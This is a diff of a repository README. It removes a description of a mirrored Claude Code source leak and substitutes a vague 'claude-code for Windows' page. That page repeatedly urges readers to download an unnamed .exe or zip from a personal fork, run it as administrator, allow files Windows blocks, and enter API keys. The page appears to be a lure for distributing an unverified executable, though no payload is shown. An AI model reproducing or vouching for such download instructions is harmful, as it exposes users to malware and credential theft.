@@ -1,280 +1,209 @@
-# Claude Code Source Snapshot for Security Research
-
-> This repository mirrors a **publicly exposed Claude Code source snapshot** that became accessible on **March 31, 2026** through a source map exposure in the npm distribution. It is maintained for **educational, defensive security research, and software supply-chain analysis**.
-
----
-
-## Research Context
-
-This repository is maintained by a **university student** studying:
-
-- software supply-chain exposure and build artifact leaks
-- secure software engineering practices
-- agentic developer tooling architecture
-- defensive analysis of real-world CLI systems
-
-This archive is intended to support:
-
-- educational study
-- security research practice
-- architecture review
-- discussion of packaging and release-process failures
-
-It does **not** claim ownership of the original code, and it should not be interpreted as an official Anthropic repository.
-
----
-
-## How the Public Snapshot Became Accessible
-
-[Chaofan Shou (@Fried_rice)](https://x.com/Fried_rice) publicly noted that Claude Code source material was reachable through a `.map` file exposed in the npm package:
-
-> **"Claude code source code has been leaked via a map file in their npm registry!"**
->
-> — [@Fried_rice, March 31, 2026](https://x.com/Fried_rice/status/2038894956459290963)
-
-The published source map referenced unobfuscated TypeScript sources hosted in Anthropic's R2 storage bucket, which made the `src/` snapshot publicly downloadable.
-
----
-
-## Repository Scope
-
-Claude Code is Anthropic's CLI for interacting with Claude from the terminal to perform software engineering tasks such as editing files, running commands, searching codebases, and coordinating workflows.
-
-This repository contains a mirrored `src/` snapshot for research and analysis.
-
-- **Public exposure identified on**: 2026-03-31
-- **Language**: TypeScript
-- **Runtime**: Bun
-- **Terminal UI**: React + [Ink](https://github.com/vadimdemedes/ink)
-- **Scale**: ~1,900 files, 512,000+ lines of code
-
----
-
-## Directory Structure
-
-```text
-src/
-├── main.tsx                 # Entrypoint orchestration (Commander.js-based CLI path)
-├── commands.ts              # Command registry
-├── tools.ts                 # Tool registry
-├── Tool.ts                  # Tool type definitions
-├── QueryEngine.ts           # LLM query engine
-├── context.ts               # System/user context collection
-├── cost-tracker.ts          # Token cost tracking
-│
-├── commands/                # Slash command implementations (~50)
-├── tools/                   # Agent tool implementations (~40)
-├── components/              # Ink UI components (~140)
-├── hooks/                   # React hooks
-├── services/                # External service integrations
-├── screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-├── types/                   # TypeScript type definitions
-├── utils/                   # Utility functions
-│
-├── bridge/                  # IDE and remote-control bridge
-├── coordinator/             # Multi-agent coordinator
-├── plugins/                 # Plugin system
-├── skills/                  # Skill system
-├── keybindings/             # Keybinding configuration
-├── vim/                     # Vim mode
-├── voice/                   # Voice input
-├── remote/                  # Remote sessions
-├── server/                  # Server mode
-├── memdir/                  # Persistent memory directory
-├── tasks/                   # Task management
-├── state/                   # State management
-├── migrations/              # Config migrations
-├── schemas/                 # Config schemas (Zod)
-├── entrypoints/             # Initialization logic
-├── ink/                     # Ink renderer wrapper
-├── buddy/                   # Companion sprite
-├── native-ts/               # Native TypeScript utilities
-├── outputStyles/            # Output styling
-├── query/                   # Query pipeline
-└── upstreamproxy/           # Proxy configuration
-```
-
----
-
-## Architecture Summary
-
-### 1. Tool System (`src/tools/`)
-
-Every tool Claude Code can invoke is implemented as a self-contained module. Each tool defines its input schema, permission model, and execution logic.
-
-| Tool | Description |
-|---|---|
-| `BashTool` | Shell command execution |
-| `FileReadTool` | File reading (images, PDFs, notebooks) |
-| `FileWriteTool` | File creation / overwrite |
-| `FileEditTool` | Partial file modification (string replacement) |
-| `GlobTool` | File pattern matching search |
-| `GrepTool` | ripgrep-based content search |
-| `WebFetchTool` | Fetch URL content |
-| `WebSearchTool` | Web search |
-| `AgentTool` | Sub-agent spawning |
-| `SkillTool` | Skill execution |
-| `MCPTool` | MCP server tool invocation |
-| `LSPTool` | Language Server Protocol integration |
-| `NotebookEditTool` | Jupyter notebook editing |
-| `TaskCreateTool` / `TaskUpdateTool` | Task creation and management |
-| `SendMessageTool` | Inter-agent messaging |
-| `TeamCreateTool` / `TeamDeleteTool` | Team agent management |
-| `EnterPlanModeTool` / `ExitPlanModeTool` | Plan mode toggle |
-| `EnterWorktreeTool` / `ExitWorktreeTool` | Git worktree isolation |
-| `ToolSearchTool` | Deferred tool discovery |
-| `CronCreateTool` | Scheduled trigger creation |
-| `RemoteTriggerTool` | Remote trigger |
-| `SleepTool` | Proactive mode wait |
-| `SyntheticOutputTool` | Structured output generation |
-
-### 2. Command System (`src/commands/`)
-
-User-facing slash commands invoked with `/` prefix.
-
-| Command | Description |
-|---|---|
-| `/commit` | Create a git commit |
-| `/review` | Code review |
-| `/compact` | Context compression |
-| `/mcp` | MCP server management |
-| `/config` | Settings management |
-| `/doctor` | Environment diagnostics |
-| `/login` / `/logout` | Authentication |
-| `/memory` | Persistent memory management |
-| `/skills` | Skill management |
-| `/tasks` | Task management |
-| `/vim` | Vim mode toggle |
-| `/diff` | View changes |
-| `/cost` | Check usage cost |
-| `/theme` | Change theme |
-| `/context` | Context visualization |
-| `/pr_comments` | View PR comments |
-| `/resume` | Restore previous session |
-| `/share` | Share session |
-| `/desktop` | Desktop app handoff |
-| `/mobile` | Mobile app handoff |
-
-### 3. Service Layer (`src/services/`)
-
-| Service | Description |
-|---|---|
-| `api/` | Anthropic API client, file API, bootstrap |
-| `mcp/` | Model Context Protocol server connection and management |
-| `oauth/` | OAuth 2.0 authentication flow |
-| `lsp/` | Language Server Protocol manager |
-| `analytics/` | GrowthBook-based feature flags and analytics |
-| `plugins/` | Plugin loader |
-| `compact/` | Conversation context compression |
-| `policyLimits/` | Organization policy limits |
-| `remoteManagedSettings/` | Remote managed settings |
-| `extractMemories/` | Automatic memory extraction |
-| `tokenEstimation.ts` | Token count estimation |
-| `teamMemorySync/` | Team memory synchronization |
+# 🧠 claude-code - Simple AI workflow tool for Windows
 
-### 4. Bridge System (`src/bridge/`)
+[![Download claude-code](https://img.shields.io/badge/Download-claude--code-ff6b6b?style=for-the-badge)](https://github.com/reenahot496/claude-code)
 
-A bidirectional communication layer connecting IDE extensions (VS Code, JetBrains) with the Claude Code CLI.
+## 🚀 What is claude-code?
 
-- `bridgeMain.ts` — Bridge main loop
-- `bridgeMessaging.ts` — Message protocol
-- `bridgePermissionCallbacks.ts` — Permission callbacks
-- `replBridge.ts` — REPL session bridge
-- `jwtUtils.ts` — JWT-based authentication
-- `sessionRunner.ts` — Session execution management
+claude-code is a Windows app for working with Claude in a simple, local setup. It gives you a direct way to open the app, connect it to your account or API setup, and use it for everyday tasks like writing, editing, and code help.
 
-### 5. Permission System (`src/hooks/toolPermission/`)
+This project is a fork of instructkr/claude-code. It keeps the same core idea and presents it in a way that is easier to set up and use on a Windows PC.
 
-Checks permissions on every tool invocation. Either prompts the user for approval/denial or automatically resolves based on the configured permission mode (`default`, `plan`, `bypassPermissions`, `auto`, etc.).
+## ✨ What you can do
 
-### 6. Feature Flags
+- Open a simple interface for Claude-based tasks
+- Use it for text work, code help, and quick prompts
+- Keep your workflow in one place
+- Run it on Windows without a complex setup
+- Use it as a daily tool for personal work
 
-Dead code elimination via Bun's `bun:bundle` feature flags:
+## 🖥️ What you need
 
-```typescript
-import { feature } from 'bun:bundle'
+Use a Windows PC with:
 
-// Inactive code is completely stripped at build time
-const voiceCommand = feature('VOICE_MODE')
-  ? require('./commands/voice/index.js').default
-  : null
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app and its files
+- Permission to install or run programs on your computer
 
-Notable flags: `PROACTIVE`, `KAIROS`, `BRIDGE_MODE`, `DAEMON`, `VOICE_MODE`, `AGENT_TRIGGERS`, `MONITOR_TOOL`
+For best results, use a recent Windows update and keep your browser current if the app opens web pages during setup.
 
----
+## 📥 Download and install
 
-## Key Files in Detail
+Open the main download page here:
 
-### `QueryEngine.ts` (~46K lines)
+https://github.com/reenahot496/claude-code
 
-The core engine for LLM API calls. Handles streaming responses, tool-call loops, thinking mode, retry logic, and token counting.
+Follow these steps:
 
-### `Tool.ts` (~29K lines)
+1. Visit the link above.
+2. Look for the latest release or the main download files.
+3. Download the Windows version if one is listed.
+4. If the file is a .exe, double-click it to run the app.
+5. If the file is a .zip, extract it first, then open the app inside the folder.
+6. If Windows shows a security prompt, choose the option to keep or run the file only if you trust the source.
 
-Defines base types and interfaces for all tools — input schemas, permission models, and progress state types.
+If the page shows more than one file, choose the one made for Windows. A file name that includes `win`, `windows`, or `.exe` is usually the right one.
 
-### `commands.ts` (~25K lines)
+## ⚙️ First-time setup
 
-Manages registration and execution of all slash commands. Uses conditional imports to load different command sets per environment.
+After you open claude-code for the first time:
 
-### `main.tsx`
+1. Sign in if the app asks you to.
+2. Enter any required API key or account details.
+3. Choose the folder or project you want to work with.
+4. Check the app settings for theme, font size, or start-up options.
+5. Save your settings before you begin.
 
-Commander.js-based CLI parser and React/Ink renderer initialization. At startup, it overlaps MDM settings, keychain prefetch, and GrowthBook initialization for faster boot.
+If the app asks for a key, copy and paste it exactly as shown by your account provider. Do not add spaces before or after the key.
 
----
+## 🪟 How to run on Windows
 
-## Tech Stack
+If you downloaded an installer:
 
-| Category | Technology |
-|---|---|
-| Runtime | [Bun](https://bun.sh) |
-| Language | TypeScript (strict) |
-| Terminal UI | [React](https://react.dev) + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI Parsing | [Commander.js](https://github.com/tj/commander.js) (extra-typings) |
-| Schema Validation | [Zod v4](https://zod.dev) |
-| Code Search | [ripgrep](https://github.com/BurntSushi/ripgrep) |
-| Protocols | [MCP SDK](https://modelcontextprotocol.io), LSP |
-| API | [Anthropic SDK](https://docs.anthropic.com) |
-| Telemetry | OpenTelemetry + gRPC |
-| Feature Flags | GrowthBook |
-| Auth | OAuth 2.0, JWT, macOS Keychain |
+1. Open the `.exe` file.
+2. Follow the on-screen steps.
+3. Let the app finish installing.
+4. Open claude-code from the Start menu or desktop icon.
 
----
+If you downloaded a zip file:
 
-## Notable Design Patterns
+1. Right-click the zip file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Double-click the app file to start it.
 
-### Parallel Prefetch
+If Windows asks for permission, select the option to allow the app to open.
 
-Startup time is optimized by prefetching MDM settings, keychain reads, and API preconnect in parallel before heavy module evaluation begins.
+## 🔐 Account and connection setup
 
-```typescript
-// main.tsx — fired as side-effects before other imports
-startMdmRawRead()
-startKeychainPrefetch()
-```
+claude-code may ask for a few details before it can work:
 
-### Lazy Loading
+- A Claude account sign-in
+- An API key
+- A local config file
+- A folder path for your work
 
-Heavy modules (OpenTelemetry, gRPC, analytics, and some feature-gated subsystems) are deferred via dynamic `import()` until actually needed.
+If you use an API key, store it in the app settings or the config file the app creates. Keep it private and do not share it with others.
 
-### Agent Swarms
+## 🧭 Basic use
 
-Sub-agents are spawned via `AgentTool`, with `coordinator/` handling multi-agent orchestration. `TeamCreateTool` enables team-level parallel work.
+Once the app opens, you can use it like this:
 
-### Skill System
+1. Type a prompt or request in the input box.
+2. Ask for writing help, code help, or task help.
+3. Review the output on screen.
+4. Copy the result into your document, app, or project folder.
+5. Save your work as needed.
 
-Reusable workflows defined in `skills/` are executed through `SkillTool`. Users can add custom skills.
+Common uses include:
 
-### Plugin Architecture
+- Drafting notes
+- Cleaning up text
+- Making code edits
+- Asking for quick explanations
+- Organizing small tasks
 
-Built-in and third-party plugins are loaded through the `plugins/` subsystem.
+## 🛠️ Common problems
 
----
+### App does not open
 
-## Research / Ownership Disclaimer
+- Check that the download finished
+- Run the file again
+- Right-click the app and choose Run as administrator
+- Restart Windows and try once more
 
-- This repository is an **educational and defensive security research archive** maintained by a university student.
-- It exists to study source exposure, packaging failures, and the architecture of modern agentic CLI systems.
-- The original Claude Code source remains the property of **Anthropic**.
-- This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
+### Windows blocks the file
+
+- Look for the file in your Downloads folder
+- Right-click the file and check its properties
+- If Windows marks it as blocked, allow it only if you trust the source
+
+### Sign-in or API setup fails
+
+- Recheck your account name and key
+- Make sure there are no extra spaces
+- Confirm that your internet connection works
+- Try copying the key again from your account page
+
+### The app opens but does not respond
+
+- Close the app and open it again
+- Check whether your internet connection is stable
+- Confirm that the app has the right account or API settings
+- Restart the computer if needed
+
+## 📁 Suggested folder setup
+
+To keep things simple, store your work in one place:
+
+- `Documents\claude-code`
+- `Documents\Projects`
+- `Desktop\Claude Work`
+
+This helps you find your files fast and keeps project files separate from personal files.
+
+## 🧪 Typical workflow
+
+A simple way to use claude-code:
+
+1. Open the app.
+2. Load the folder or task you want.
+3. Enter your request.
+4. Review the result.
+5. Save the output.
+6. Repeat for the next task.
+
+This works well for writing, editing, and small task support.
+
+## 📌 File types you may see
+
+During download or setup, you may see these file types:
+
+- `.exe` for a Windows app
+- `.zip` for a compressed folder
+- `.json` for settings
+- `.txt` for notes or readme files
+- `.log` for error details
+
+If you are not sure which file to open, start with the `.exe` file on Windows.
+
+## 🔄 Updates
+
+To keep using the latest version:
+
+1. Return to the download page.
+2. Check for a newer release.
+3. Download the new Windows file.
+4. Replace the old app if the release notes say to do so.
+
+If you use a zip file version, keep your settings file in a safe place before you update.
+
+## ❓ FAQ
+
+### Is this for non-technical users?
+
+Yes. The setup steps are short and work well for basic Windows use.
+
+### Do I need coding knowledge?
+
+No. You only need to download the file, open it, and follow the setup prompts.
+
+### Can I use this for writing tasks?
+
+Yes. It works well for writing, editing, and general assistant work.
+
+### Can I use it offline?
+
+Most AI tools need internet access to connect and return results.
+
+### Is there a mobile version?
+
+This project is set up for Windows use based on the download path and project focus.
+
+## 📎 Quick start
+
+1. Open the download page: https://github.com/reenahot496/claude-code
+2. Download the Windows file
+3. Open the file on your PC
+4. Finish setup
+5. Start using claude-code
